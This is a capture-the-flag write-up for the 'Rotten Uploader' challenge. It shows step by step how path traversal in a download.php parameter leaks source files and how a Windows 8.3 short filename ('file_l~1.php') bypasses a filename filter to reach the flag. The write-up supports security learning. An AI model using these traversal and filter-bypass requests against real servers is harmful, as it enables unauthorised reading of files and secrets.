# Rotten Uploader writeup(LFI)
[Challenge.](http://rup.chal.ctf.westerns.tokyo/)

![Landing](images/Landing.png)

Begin to hover a link to reveal: `http://rup.chal.ctf.westerns.tokyo/download.php?f=test.cpp`

Is vulnerable to LFI? Yes!
Get the index.php with  `http://rup.chal.ctf.westerns.tokyo/download.php?f=../index.php`  ( ../ cause download take file from upload dir ).

```
<?php
/**
 *
 */
include('file_list.php'); <-- Interesting
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0 Level 2//EN">
<html>
  <head>
    <title>Uploader</title>
  </head>
  <body>
    <h1>Simple Uploader</h1>
    <p>There are no upload features.</p>
    <h3>Files</h3>
    <table width="100%" border="1">
		  <tr>
			<th>#</th>
			<th>Filename</th>
			<th>Size</th>
			<th>Link</th>
		  </tr>
			  <?php foreach($files as $file): ?>
	<?php if($file[0]) continue; // visible flag ?>  
		  <tr>
			<td><?= $file[1]; ?></td>
			<td><?= $file[2]; ?></td>
			<td><?= $file[3]; ?> bytes</td>
			<td><a href="download.php?f=<?= $file[4]; ?>">Download</a></td>
		  </tr>
          <?php endforeach;?>
      </table>
  </body>
</html>
```
Next step: GET file_list.php!

LFI: `http://rup.chal.ctf.westerns.tokyo/download.php?f=../file_list.php` --> file empty

Maybe the download.php is filtering our request :
`http://rup.chal.ctf.westerns.tokyo/download.php?f=../download.php`

```
<?php
header("Content-Type: application/octet-stream");
if(stripos($_GET['f'], 'file_list') !== FALSE) die(); <- FILTER
readfile('uploads/' . $_GET['f']); // safe_dir is enabled. 
?>
```
Basically the filter drops the GET for the file_list file... 

Make some information gathering could help to evade the filter: `nmap -O -Pn  rup.chal.ctf.westerns.tokyo`

It's seems that the web server run over Win, now we can try to converte the filename to [8.3 filename.](https://en.wikipedia.org/wiki/8.3_filename)

LFI(8.3) => `http://rup.chal.ctf.westerns.tokyo/download.php?f=../file_l~1.php`

```
<?php
$files = [
  [FALSE, 1, 'test.cpp', 1135, 'test.cpp'],
  [FALSE, 2, 'test.c', 74, 'test.c'],
  [TRUE, 3, 'flag_c82e41f5bb7c8d4b947c9586444578ade88fe0d7', 35, 'flag_c82e41f5bb7c8d4b947c9586444578ade88fe0d7'], # <-- The flag File
  [FALSE, 4, 'test.rb', 1446, 'test.rb'],
];
```

Now download  `http://rup.chal.ctf.westerns.tokyo/download.php?f=flag_c82e41f5bb7c8d4b947c9586444578ade88fe0d7` , open and the flag is: TWCTF{Hotto_Smile}.






